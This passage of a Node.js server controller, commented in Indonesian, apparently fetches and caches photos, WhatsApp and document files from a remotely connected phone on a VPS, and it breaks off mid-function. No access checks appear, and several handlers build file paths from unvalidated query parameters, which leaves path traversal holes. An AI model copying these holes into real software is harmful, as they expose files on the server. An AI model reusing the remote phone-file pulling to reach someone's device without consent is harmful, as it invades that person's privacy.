const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const db = require('../db');
const socketModule = require('../socket');
const pendingDownloads = require('../utils/pendingDownloads');

// 1. GET /api/files - Menyeleksi berkas dari cache JSON lokal VPS (select & filter tgl)
async function getFiles(req, res) {
  const folder = req.query.folder || 'DCIM/Camera';
  let { date, deviceId } = req.query;

  // Jika date bernilai 'today', tentukan tanggal hari ini (YYYY-MM-DD)
  if (date === 'today') {
    const now = new Date();
    const localYear = now.getFullYear();
    const localMonth = String(now.getMonth() + 1).padStart(2, '0');
    const localDay = String(now.getDate()).padStart(2, '0');
    date = `${localYear}-${localMonth}-${localDay}`;
  }

  // Resolve deviceId
  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    try {
      const dbDevices = await db.getDevices();
      if (dbDevices && dbDevices.length > 0) {
        activeDeviceId = dbDevices[0].id;
      }
    } catch (e) { }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);

  if (!fs.existsSync(targetDir)) {
    if (folder === 'Root' || folder === '/' || !folder) {
      const list = [];
      if (fs.existsSync(uploadDir)) {
        const found = new Set();
        for (const entry of fs.readdirSync(uploadDir)) {
          if (entry.startsWith(`${activeDeviceId}-`)) {
            const rootName = entry.substring(`${activeDeviceId}-`.length);
            if (rootName) found.add(rootName);
          }
        }
        for (const std of ['DCIM', 'Pictures', 'Download', 'Documents', 'WhatsApp']) {
          found.add(std);
        }
        for (const f of Array.from(found).sort()) {
          list.push({
            name: f,
            isDirectory: true,
            isFile: false,
            path: f,
            relativePath: f
          });
        }
      }
      return res.json(list);
    }
    return res.json([]);
  }

  let files = [];
  try {
    // Baca all.json
    const allFilePath = path.join(targetDir, 'all.json');
    if (fs.existsSync(allFilePath)) {
      files = JSON.parse(fs.readFileSync(allFilePath, 'utf8'));
    }

    // Jika filter tanggal dikirim, saring secara in-memory
    if (date) {
      files = files.filter(file => {
        if (!file.mtime) return false;
        try {
          const d = new Date(file.mtime);
          if (isNaN(d.getTime())) return false;
          const isoDate = d.toISOString().split('T')[0];
          const localYear = d.getFullYear();
          const localMonth = String(d.getMonth() + 1).padStart(2, '0');
          const localDay = String(d.getDate()).padStart(2, '0');
          const localDateStr = `${localYear}-${localMonth}-${localDay}`;
          return isoDate === date || localDateStr === date;
        } catch (e) {
          return false;
        }
      });
    }

    // Urutkan mtime descending
    files.sort((a, b) => {
      const timeA = a.mtime ? new Date(a.mtime).getTime() : 0;
      const timeB = b.mtime ? new Date(b.mtime).getTime() : 0;
      return timeB - timeA;
    });

    // Dapatkan status caching fisik untuk setiap file
    const enrichedFiles = files.map(file => {
      const fileExtension = path.extname(file.name).toLowerCase();
      const mtime = file.mtime || file.fileMtime;
      let dateStr = 'no-date';
      if (mtime) {
        try {
          const d = new Date(mtime);
          if (!isNaN(d.getTime())) {
            const localYear = d.getFullYear();
            const localMonth = String(d.getMonth() + 1).padStart(2, '0');
            const localDay = String(d.getDate()).padStart(2, '0');
            dateStr = `${localYear}-${localMonth}-${localDay}`;
          }
        } catch (e) {}
      }
      
      const isImgExt = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.heic', '.bmp'].includes(fileExtension);
      let previewFileName = file.name;
      if (!isImgExt) {
        previewFileName = `${file.name}.jpg`;
      }
      const fileDiskPath = path.join(targetDir, dateStr, previewFileName);
      const isCachedOnVps = fs.existsSync(fileDiskPath);
      
      return {
        ...file,
        isCachedOnVps,
        vpsCacheDate: dateStr
      };
    });

    res.json(enrichedFiles);
  } catch (err) {
    res.status(500).json({ error: 'Gagal memuat berkas cache dari VPS.', details: err.message });
  }
}

// 2. GET /api/files/get - Membaca metadata berkas spesifik dari cache JSON lokal VPS
async function getFileMetadata(req, res) {
  const { folder, name, deviceId } = req.query;
  if (!folder || !name) {
    return res.status(400).json({ error: 'Parameter "folder" dan "name" diperlukan.' });
  }

  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    try {
      const dbDevices = await db.getDevices();
      if (dbDevices && dbDevices.length > 0) {
        activeDeviceId = dbDevices[0].id;
      }
    } catch (e) { }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);

  if (!fs.existsSync(targetDir)) {
    return res.status(404).json({ error: 'Cache daftar berkas untuk folder ini belum tersedia.' });
  }

  try {
    const allFilePath = path.join(targetDir, 'all.json');
    if (!fs.existsSync(allFilePath)) {
      return res.status(404).json({ error: 'Cache daftar berkas untuk folder ini belum tersedia.' });
    }

    const files = JSON.parse(fs.readFileSync(allFilePath, 'utf8'));
    const foundFile = files.find(f => f.name === name);

    if (!foundFile) {
      return res.status(404).json({ error: `Berkas "${name}" tidak ditemukan di dalam cache.` });
    }

    res.json(foundFile);
  } catch (err) {
    res.status(500).json({ error: 'Gagal membaca metadata berkas dari cache.', details: err.message });
  }
}

// 3. GET /api/files/preview - Inisiasi request preview berkas dari HP menggunakan jalur path cache
async function previewFileCached(req, res) {
  const { folder, name, deviceId } = req.query;
  if (!folder || !name) {
    return res.status(400).json({ error: 'Parameter "folder" dan "name" diperlukan.' });
  }

  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);

  if (!fs.existsSync(targetDir)) {
    return res.status(404).json({ error: 'Cache daftar berkas belum tersedia. Akses /devices/:deviceId/files terlebih dahulu.' });
  }

  try {
    const allFilePath = path.join(targetDir, 'all.json');
    if (!fs.existsSync(allFilePath)) {
      return res.status(404).json({ error: 'Cache daftar berkas belum tersedia. Akses /devices/:deviceId/files terlebih dahulu.' });
    }

    const files = JSON.parse(fs.readFileSync(allFilePath, 'utf8'));
    const targetFile = files.find(f => f.name === name);

    if (!targetFile) {
      return res.status(404).json({ error: `Berkas "${name}" tidak ditemukan.` });
    }

    const deviceFilePath = targetFile.path;
    const fileExtension = path.extname(name).toLowerCase();

    // 1. Format nama folder berdasarkan mtime
    const mtime = targetFile.mtime || targetFile.fileMtime;
    let dateStr = 'no-date';
    if (mtime) {
      try {
        const d = new Date(mtime);
        if (!isNaN(d.getTime())) {
          const localYear = d.getFullYear();
          const localMonth = String(d.getMonth() + 1).padStart(2, '0');
          const localDay = String(d.getDate()).padStart(2, '0');
          dateStr = `${localYear}-${localMonth}-${localDay}`;
        }
      } catch (e) { }
    } else {
      // Fallback ke tanggal saat ini
      const d = new Date();
      const localYear = d.getFullYear();
      const localMonth = String(d.getMonth() + 1).padStart(2, '0');
      const localDay = String(d.getDate()).padStart(2, '0');
      dateStr = `${localYear}-${localMonth}-${localDay}`;
    }

    // 2. Pastikan folder mtime ada
    const dateDir = path.join(targetDir, dateStr);
    if (!fs.existsSync(dateDir)) {
      fs.mkdirSync(dateDir, { recursive: true });
    }

    // 3. Tentukan nama berkas hasil preview (jika bukan ekstensi gambar, simpan sebagai .jpg)
    const isImgExt = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.heic', '.bmp'].includes(fileExtension);
    let previewFileName = name;
    if (!isImgExt) {
      previewFileName = `${name}.jpg`;
    }
    const targetDiskPath = path.join(dateDir, previewFileName);

    let contentType = 'image/jpeg';
    if (fileExtension === '.png') contentType = 'image/png';
    else if (fileExtension === '.gif') contentType = 'image/gif';
    else if (fileExtension === '.webp') contentType = 'image/webp';

    // Cek jika file preview sudah tersimpan di VPS local disk (Offline Fallback)
    if (fs.existsSync(targetDiskPath)) {
      console.log(`⚡ Serving preview directly from VPS cache: ${targetDiskPath}`);
      res.setHeader('Content-Disposition', 'inline');
      res.setHeader('Content-Type', contentType);
      return res.sendFile(path.resolve(targetDiskPath));
    }

    const downloadSessionId = crypto.randomBytes(16).toString('hex');
    console.log(`👁️  Meminta preview berkas dari perangkat: "${deviceFilePath}" (Session: ${downloadSessionId})`);
    console.log(`💾 Preview akan disimpan di VPS: ${targetDiskPath}`);

    res.setHeader('Content-Disposition', 'inline');
    res.setHeader('Content-Type', contentType);

    const timer = setTimeout(() => {
      if (pendingDownloads.has(downloadSessionId)) {
        console.warn(`⏳ Preview session ${downloadSessionId} timeout.`);
        const pending = pendingDownloads.get(downloadSessionId);
        pending.res.status(504).end('Gateway Timeout: Perangkat tidak mengirimkan preview.');
        pendingDownloads.delete(downloadSessionId);
      }
    }, 30000);

    // Set saveToDisk dan targetDiskPath agar sekaligus menyimpan file hasil stream ke VPS disk
    pendingDownloads.set(downloadSessionId, {
      res,
      timer,
      fileName: name,
      saveToDisk: true,
      targetDiskPath,
      isStreamResponse: true
    });

    await socketModule.sendDeviceCommand(activeDeviceId, 'GET_PREVIEW', {
      path: deviceFilePath,
      downloadSessionId
    });

    await db.logAccess(activeDeviceId, name, 'PREVIEW_FILE');
  } catch (err) {
    res.status(500).end(`Gagal mengambil preview: ${err.message}`);
  }
}

// 4. GET /api/files/download - Inisiasi request download berkas penuh dari HP menggunakan jalur path cache
async function downloadFileCached(req, res) {
  const { folder, name, deviceId } = req.query;
  if (!folder || !name) {
    return res.status(400).json({ error: 'Parameter "folder" dan "name" diperlukan.' });
  }

  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);

  if (!fs.existsSync(targetDir)) {
    return res.status(404).json({ error: 'Cache daftar berkas belum tersedia. Akses /devices/:deviceId/files terlebih dahulu.' });
  }

  try {
    const allFilePath = path.join(targetDir, 'all.json');
    if (!fs.existsSync(allFilePath)) {
      return res.status(404).json({ error: 'Cache daftar berkas belum tersedia. Akses /devices/:deviceId/files terlebih dahulu.' });
    }

    const files = JSON.parse(fs.readFileSync(allFilePath, 'utf8'));
    const targetFile = files.find(f => f.name === name);

    if (!targetFile) {
      return res.status(404).json({ error: `Berkas "${name}" tidak ditemukan.` });
    }

    const deviceFilePath = targetFile.path;
    const fileExtension = path.extname(name).toLowerCase();

    // Tentukan folder tanggal berdasarkan mtime berkas untuk melacak lokasinya di VPS
    const mtime = targetFile.mtime || targetFile.fileMtime;
    let dateStr = 'no-date';
    if (mtime) {
      try {
        const d = new Date(mtime);
        if (!isNaN(d.getTime())) {
          const localYear = d.getFullYear();
          const localMonth = String(d.getMonth() + 1).padStart(2, '0');
          const localDay = String(d.getDate()).padStart(2, '0');
          dateStr = `${localYear}-${localMonth}-${localDay}`;
        }
      } catch (e) { }
    } else {
      const d = new Date();
      const localYear = d.getFullYear();
      const localMonth = String(d.getMonth() + 1).padStart(2, '0');
      const localDay = String(d.getDate()).padStart(2, '0');
      dateStr = `${localYear}-${localMonth}-${localDay}`;
    }

    const isImgExt = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.heic', '.bmp'].includes(fileExtension);
    let previewFileName = name;
    if (!isImgExt) {
      previewFileName = `${name}.jpg`;
    }
    const targetDiskPath = path.join(targetDir, dateStr, previewFileName);

    // Cek jika berkas sudah tersimpan di VPS disk
    if (fs.existsSync(targetDiskPath)) {
      console.log(`⚡ Serving file download directly from VPS cache: ${targetDiskPath}`);
      res.setHeader('Content-Disposition', `attachment; filename="${encodeURIComponent(name)}"`);
      res.setHeader('Content-Type', 'application/octet-stream');
      return res.sendFile(path.resolve(targetDiskPath));
    }

    res.setHeader('Content-Disposition', `attachment; filename="${encodeURIComponent(name)}"`);
    res.setHeader('Content-Type', 'application/octet-stream');

    const downloadSessionId = crypto.randomBytes(16).toString('hex');
    console.log(`📥 Meminta download berkas penuh dari perangkat: "${deviceFilePath}" (Session: ${downloadSessionId})`);

    const timer = setTimeout(() => {
      if (pendingDownloads.has(downloadSessionId)) {
        console.warn(`⏳ Download session ${downloadSessionId} timeout.`);
        const pending = pendingDownloads.get(downloadSessionId);
        pending.res.status(504).end('Gateway Timeout: Perangkat tidak merespon.');
        pendingDownloads.delete(downloadSessionId);
      }
    }, 30000);

    pendingDownloads.set(downloadSessionId, { res, timer, fileName: name });

    await socketModule.sendDeviceCommand(activeDeviceId, 'GET_FILE', {
      path: deviceFilePath,
      downloadSessionId
    });

    await db.logAccess(activeDeviceId, name, 'DOWNLOAD_FILE');
  } catch (err) {
    res.status(500).end(`Gagal mengunduh berkas: ${err.message}`);
  }
}

// 5. GET /api/files/json-list - Menampilkan daftar file JSON cache yang tersimpan di VPS
async function getJsonList(req, res) {
  const folder = req.query.folder || 'DCIM/Camera';
  const { deviceId } = req.query;

  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    try {
      const dbDevices = await db.getDevices();
      if (dbDevices && dbDevices.length > 0) {
        activeDeviceId = dbDevices[0].id;
      }
    } catch (e) { }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);

  if (!fs.existsSync(targetDir)) {
    return res.json([]);
  }

  try {
    const fileNames = fs.readdirSync(targetDir)
      .filter(name => name.endsWith('.json'))
      .sort((a, b) => b.localeCompare(a)); // Urutkan nama (tanggal) descending
    res.json(fileNames);
  } catch (err) {
    res.status(500).json({ error: 'Gagal membaca daftar JSON cache.', details: err.message });
  }
}

// 6. GET /api/files/json-get - Membaca isi berkas JSON cache spesifik di VPS
async function getJsonContent(req, res) {
  const folder = req.query.folder || 'DCIM/Camera';
  const { name, deviceId } = req.query;

  if (!name) {
    return res.status(400).json({ error: 'Parameter "name" (nama file JSON) diperlukan.' });
  }

  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    try {
      const dbDevices = await db.getDevices();
      if (dbDevices && dbDevices.length > 0) {
        activeDeviceId = dbDevices[0].id;
      }
    } catch (e) { }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);
  const filePath = path.join(targetDir, name.endsWith('.json') ? name : `${name}.json`);

  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: `Berkas JSON cache "${name}" tidak ditemukan di VPS.` });
  }

  try {
    const content = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    res.json(content);
  } catch (err) {
    res.status(500).json({ error: 'Gagal membaca berkas JSON cache.', details: err.message });
  }
}

// Helper ekstraksi timestamp tanggal berkas dari nama/metadata (terbaru ke terlama)
function extractFileTimestamp(file) {
  if (!file) return 0;
  const name = file.name || file.fileName || file.originalName || file.filename || '';

  // 1. Format: Screenshot_YYYYMMDD_HHMMSS atau IMG_YYYYMMDD_HHMMSS
  const matchDateTime = name.match(/(?:Screenshot|IMG|VID)[_-](\d{4})(\d{2})(\d{2})[_-](\d{2})(\d{2})(\d{2})/i);
  if (matchDateTime) {
    const [_, y, m, d, h, min, s] = matchDateTime;
    const time = new Date(`${y}-${m}-${d}T${h}:${min}:${s}`).getTime();
    if (!isNaN(time) && time > 0) return time;
  }

  // 2. Format: YYYYMMDD_HHMMSS
  const matchDateNum = name.match(/(\d{4})(\d{2})(\d{2})_(\d{2})(\d{2})(\d{2})/);
  if (matchDateNum) {
    const [_, y, m, d, h, min, s] = matchDateNum;
    const time = new Date(`${y}-${m}-${d}T${h}:${min}:${s}`).getTime();
    if (!isNaN(time) && time > 0) return time;
  }

  // 3. Format: Unix epoch timestamp 13 digit
  const matchEpoch = name.match(/(?:^|[_-])(1[6-9]\d{11})(?:[._-]|$)/);
  if (matchEpoch) {
    const epoch = parseInt(matchEpoch[1], 10);
    if (!isNaN(epoch) && epoch > 0) return epoch;
  }

  // 4. Format: file.date (misal '2026-10-20')
  if (file.date && file.date !== 'no-date' && file.date !== 'null') {
    const d = new Date(file.date).getTime();
    if (!isNaN(d) && d > 0) return d;
  }

  // 5. Format: file.mtime / fileMtime / createdAt
  const mtime = file.mtime || file.fileMtime || file.createdAt;
  if (mtime) {
    const d = new Date(mtime).getTime();
    if (!isNaN(d) && d > 0) return d;
  }

  return 0;
}

// 7. GET /api/vps/files - Menampilkan daftar berkas fisik terkompresi & struktur direktori di VPS
async function getVpsFiles(req, res) {
  let folderParam = req.query.folder || '';
  const { deviceId } = req.query;

  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    try {
      const dbDevices = await db.getDevices();
      if (dbDevices && dbDevices.length > 0) {
        activeDeviceId = dbDevices[0].id;
      }
    } catch (e) { }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';

  if (!fs.existsSync(uploadDir)) {
    return res.json([]);
  }

  try {
    const list = [];
    const isRoot = !folderParam || folderParam === 'Root' || folderParam === '/' || folderParam === '';

    // 1. KASUS ROOT: Tampilkan daftar folder tingkat atas (DCIM, Pictures, Documents, dll.)
    if (isRoot) {
      const foundFolders = new Set();
      const allEntries = fs.readdirSync(uploadDir);

      // Cari semua folder yang berawalan dengan deviceId
      for (const entry of allEntries) {
        const fullPath = path.join(uploadDir, entry);
        if (fs.statSync(fullPath).isDirectory()) {
          if (entry.startsWith(`${activeDeviceId}-`)) {
            const rootFolderName = entry.substring(`${activeDeviceId}-`.length);
            if (rootFolderName) foundFolders.add(rootFolderName);
          }
        }
      }

      // Pastikan folder standar perangkat juga tersedia untuk navigasi
      const standardFolders = ['DCIM', 'Pictures', 'Download', 'Documents', 'WhatsApp', 'Movies', 'Music'];
      for (const std of standardFolders) {
        foundFolders.add(std);
      }

      for (const folderName of Array.from(foundFolders).sort()) {
        const fullDirPath = path.join(uploadDir, `${activeDeviceId}-${folderName}`);
        let mtime = new Date();
        if (fs.existsSync(fullDirPath)) {
          mtime = fs.statSync(fullDirPath).mtime;
        }

        list.push({
          name: folderName,
          isDirectory: true,
          isFile: false,
          date: null,
          folder: 'Root',
          deviceId: activeDeviceId,
          size: 0,
          mtime: mtime,
          path: folderName,
          relativePath: folderName
        });
      }

      return res.json(list);
    }

    // 2. KASUS 'all': Mode flat semua file fisik perangkat
    if (folderParam === 'all') {
      const allDirs = fs.readdirSync(uploadDir);
      for (const d of allDirs) {
        if (!d.startsWith(`${activeDeviceId}-`)) continue;
        const fullDirPath = path.join(uploadDir, d);
        if (!fs.statSync(fullDirPath).isDirectory()) continue;
        const baseFolder = d.substring(`${activeDeviceId}-`.length);

        // Scan rekursif untuk mengumpulkan seluruh file dan parsing folder hierarkis + tanggal
        function scanDeepFiles(curDir, subRelPath) {
          const items = fs.readdirSync(curDir);
          for (const item of items) {
            if (item === 'all.json' || item.startsWith('.')) continue;
            const itemPath = path.join(curDir, item);
            const stat = fs.statSync(itemPath);
            if (stat.isDirectory()) {
              scanDeepFiles(itemPath, subRelPath ? `${subRelPath}/${item}` : item);
            } else if (stat.isFile()) {
              let itemDate = null;
              let itemFolder = baseFolder;
              let itemRelPath = subRelPath ? `${subRelPath}/${item}` : item;

              if (subRelPath) {
                const subParts = subRelPath.split(/[/\\]+/).filter(Boolean);
                if (subParts.length > 0) {
                  const lastSegment = subParts[subParts.length - 1];
                  if (/^\d{4}-\d{2}-\d{2}$/.test(lastSegment) || lastSegment === 'no-date') {
                    itemDate = lastSegment;
                    const folderSegments = subParts.slice(0, -1);
                    itemFolder = folderSegments.length > 0 ? `${baseFolder}/${folderSegments.join('/')}` : baseFolder;
                    itemRelPath = `${itemDate}/${item}`;
                  } else {
                    itemFolder = `${baseFolder}/${subParts.join('/')}`;
                    itemRelPath = item;
                  }
                }
              }

              list.push({
                name: item,
                isDirectory: false,
                isFile: true,
                date: itemDate,
                folder: itemFolder,
                deviceId: activeDeviceId,
                size: stat.size,
                mtime: stat.mtime,
                relativePath: itemRelPath
              });
            }
          }
        }
        scanDeepFiles(fullDirPath, '');
      }

      list.sort((a, b) => extractFileTimestamp(b) - extractFileTimestamp(a));
      return res.json(list);
    }

    // 3. KASUS FOLDER SPESIFIK & HIERARKIS (e.g. 'Pictures', 'Pictures/Screenshots', 'Pictures/Screenshots/Games')
    const normFolder = folderParam.replace(/^[/\\]+/, '').replace(/[/\\]+$/, '');
    const parts = normFolder.split(/[/\\]+/).filter(Boolean);
    const rootPart = `${activeDeviceId}-${parts[0]}`;
    const remainingParts = parts.slice(1);
    const targetDir = path.resolve(uploadDir, rootPart, ...remainingParts);

    // Keamanan directory traversal
    if (!targetDir.startsWith(path.resolve(uploadDir))) {
      return res.status(403).json({ error: 'Akses tidak diperbolehkan.' });
    }

    if (!fs.existsSync(targetDir)) {
      return res.json([]);
    }

    const items = fs.readdirSync(targetDir);
    for (const item of items) {
      if (item === 'all.json' || item.startsWith('.')) continue;

      const itemPath = path.join(targetDir, item);
      const stat = fs.statSync(itemPath);

      if (stat.isDirectory()) {
        const isDateFolder = /^\d{4}-\d{2}-\d{2}$/.test(item) || item === 'no-date';

        if (isDateFolder) {
          // Folder tanggal: flatten file-filenya ke dalam folder saat ini dengan metadata tanggal
          const subFiles = fs.readdirSync(itemPath);
          for (const subFilename of subFiles) {
            if (subFilename === 'all.json' || subFilename.startsWith('.')) continue;
            const subFilePath = path.join(itemPath, subFilename);
            const subStat = fs.statSync(subFilePath);
            if (subStat.isFile()) {
              list.push({
                name: subFilename,
                isDirectory: false,
                isFile: true,
                date: item,
                folder: normFolder,
                deviceId: activeDeviceId,
                size: subStat.size,
                mtime: subStat.mtime,
                relativePath: `${item}/${subFilename}`
              });
            }
          }
        } else {
          // Folder reguler (subdirektori seperti Screenshots, Games, dll.)
          list.push({
            name: item,
            isDirectory: true,
            isFile: false,
            date: null,
            folder: normFolder,
            deviceId: activeDeviceId,
            size: 0,
            mtime: stat.mtime,
            path: `${normFolder}/${item}`,
            relativePath: `${normFolder}/${item}`
          });
        }
      } else if (stat.isFile()) {
        // File biasa yang berada langsung di direktori ini
        list.push({
          name: item,
          isDirectory: false,
          isFile: true,
          date: null,
          folder: normFolder,
          deviceId: activeDeviceId,
          size: stat.size,
          mtime: stat.mtime,
          relativePath: item
        });
      }
    }

    // Urutkan: Direktori/Folder di atas, kemudian berkas berdasarkan tanggal terbaru ke terlama
    list.sort((a, b) => {
      if (a.isDirectory && !b.isDirectory) return -1;
      if (!a.isDirectory && b.isDirectory) return 1;
      if (a.isDirectory && b.isDirectory) {
        return (a.name || '').localeCompare(b.name || '');
      }
      return extractFileTimestamp(b) - extractFileTimestamp(a);
    });

    res.json(list);
  } catch (err) {
    res.status(500).json({ error: 'Gagal membaca berkas di VPS.', details: err.message });
  }
}

// 8. GET /api/vps/files/download - Mengunduh berkas fisik terkompresi langsung dari VPS disk
function downloadVpsFile(req, res) {
  const folder = req.query.folder || 'DCIM/Camera';
  const { deviceId, date, name, relativePath } = req.query;

  if (!name) {
    return res.status(400).json({ error: 'Parameter "name" diperlukan.' });
  }

  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    const activeDevices = socketModule.getActiveDevicesList();
    if (activeDevices.length > 0) {
      activeDeviceId = activeDevices[0];
    }
  }

  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID tidak ditemukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const normFolder = (folder || '').replace(/^[/\\]+/, '').replace(/[/\\]+$/, '');
  const parts = normFolder.split(/[/\\]+/).filter(Boolean);
  const basePart = parts.length > 0 ? parts[0] : '';
  const rootPart = basePart ? `${activeDeviceId}-${basePart}` : activeDeviceId;
  const remainingParts = parts.slice(1);
  const targetDir = path.resolve(uploadDir, rootPart, ...remainingParts);
  const baseDeviceDir = path.resolve(uploadDir, rootPart);

  // Helper pencarian mendalam rekursif jika file berada di folder bersarang
  function findFileDeep(dir, targetName, maxDepth = 4, curDepth = 0) {
    if (curDepth > maxDepth || !fs.existsSync(dir)) return null;
    try {
      const entries = fs.readdirSync(dir);
      for (const entry of entries) {
        if (entry === 'all.json' || entry.startsWith('.')) continue;
        const full = path.join(dir, entry);
        const stat = fs.statSync(full);
        if (stat.isFile() && entry === targetName) {
          return full;
        } else if (stat.isDirectory()) {
          const found = findFileDeep(full, targetName, maxDepth, curDepth + 1);
          if (found) return found;
        }
      }
    } catch (_) { }
    return null;
  }

  // Cari file secara cerdas dan berurutan:
  let filePath = null;

  // 1. Cek langsung via relativePath jika disediakan
  if (relativePath) {
    const relClean = relativePath.replace(/^[/\\]+/, '');
    const cand1 = path.resolve(targetDir, relClean);
    if (fs.existsSync(cand1) && fs.statSync(cand1).isFile()) filePath = cand1;
    if (!filePath) {
      const cand2 = path.resolve(baseDeviceDir, relClean);
      if (fs.existsSync(cand2) && fs.statSync(cand2).isFile()) filePath = cand2;
    }
  }

  // 2. targetDir / date / name (jika date ada)
  if (!filePath && date && date !== 'undefined' && date !== 'null' && date !== 'no-date') {
    const candidate = path.resolve(targetDir, date, name);
    if (fs.existsSync(candidate) && fs.statSync(candidate).isFile()) filePath = candidate;
  }

  // 3. targetDir / name
  if (!filePath) {
    const candidate = path.resolve(targetDir, name);
    if (fs.existsSync(candidate) && fs.statSync(candidate).isFile()) filePath = candidate;
  }

  // 4. cari di subfolder langsung di dalam targetDir (1 level)
  if (!filePath && fs.existsSync(targetDir)) {
    try {
      const subItems = fs.readdirSync(targetDir);
      for (const sub of subItems) {
        const candidate = path.resolve(targetDir, sub, name);
        if (fs.existsSync(candidate) && fs.statSync(candidate).isFile()) {
          filePath = candidate;
          break;
        }
      }
    } catch (_) { }
  }

  // 5. Fallback pencarian rekursif di targetDir atau baseDeviceDir
  if (!filePath && fs.existsSync(targetDir)) {
    filePath = findFileDeep(targetDir, name);
  }
  if (!filePath && fs.existsSync(baseDeviceDir)) {
    filePath = findFileDeep(baseDeviceDir, name);
  }
  // 6. Fallback global device uploads
  if (!filePath && fs.existsSync(uploadDir)) {
    try {
      const allDirs = fs.readdirSync(uploadDir);
      for (const d of allDirs) {
        if (d.startsWith(`${activeDeviceId}-`)) {
          const found = findFileDeep(path.join(uploadDir, d), name);
          if (found) {
            filePath = found;
            break;
          }
        }
      }
    } catch (_) { }
  }

  // Pencegahan directory traversal attack
  if (!filePath || !filePath.startsWith(path.resolve(uploadDir)) || !fs.existsSync(filePath)) {
    return res.status(404).json({ error: 'Berkas tidak ditemukan di VPS.' });
  }

  const inline = req.query.inline === 'true';
  if (!inline) {
    res.setHeader('Content-Disposition', `attachment; filename="${encodeURIComponent(name)}"`);
  } else {
    res.setHeader('Content-Disposition', 'inline');
    const ext = path.extname(name).toLowerCase();
    if (['.jpg', '.jpeg'].includes(ext)) res.setHeader('Content-Type', 'image/jpeg');
    else if (ext === '.png') res.setHeader('Content-Type', 'image/png');
    else if (ext === '.webp') res.setHeader('Content-Type', 'image/webp');
    else if (ext === '.gif') res.setHeader('Content-Type', 'image/gif');
  }

  res.sendFile(filePath);
}

// 9. DELETE /api/vps/files - Menghapus berkas fisik terkompresi dari VPS disk
async function deleteVpsFile(req, res) {
  const folder = req.query.folder || 'DCIM/Camera';
  const { deviceId, date, name, relativePath } = req.query;

  if (!name) {
    return res.status(400).json({ error: 'Parameter "name" diperlukan.' });
  }

  let activeDeviceId = deviceId;
  if (!activeDeviceId) {
    return res.status(400).json({ error: 'Device ID diperlukan.' });
  }

  const uploadDir = process.env.UPLOAD_DIR || './uploads';
  const normFolder = (folder || '').replace(/^[/\\]+/, '').replace(/[/\\]+$/, '');
  const parts = normFolder.split(/[/\\]+/).filter(Boolean);
  const basePart = parts.length > 0 ? parts[0] : '';
  const rootPart = basePart ? `${activeDeviceId}-${basePart}` : activeDeviceId;
  const remainingParts = parts.slice(1);
  const targetDir = path.resolve(uploadDir, rootPart, ...remainingParts);
  const baseDeviceDir = path.resolve(uploadDir, rootPart);

  // Helper pencarian mendalam rekursif
  function findFileDeep(dir, targetName, maxDepth = 4, curDepth = 0) {
    if (curDepth > maxDepth || !fs.existsSync(dir)) return null;
    try {
      const entries = fs.readdirSync(dir);
      for (const entry of entries) {
        if (entry === 'all.json' || entry.startsWith('.')) continue;
        const full = path.join(dir, entry);
        const stat = fs.statSync(full);
        if (stat.isFile() && entry === targetName) {
          return full;
        } else if (stat.isDirectory()) {
          const found = findFileDeep(full, targetName, maxDepth, curDepth + 1);
          if (found) return found;
        }
      }
    } catch (_) { }
    return null;
  }

  let filePath = null;

  // 1. Cek langsung via relativePath
  if (relativePath) {
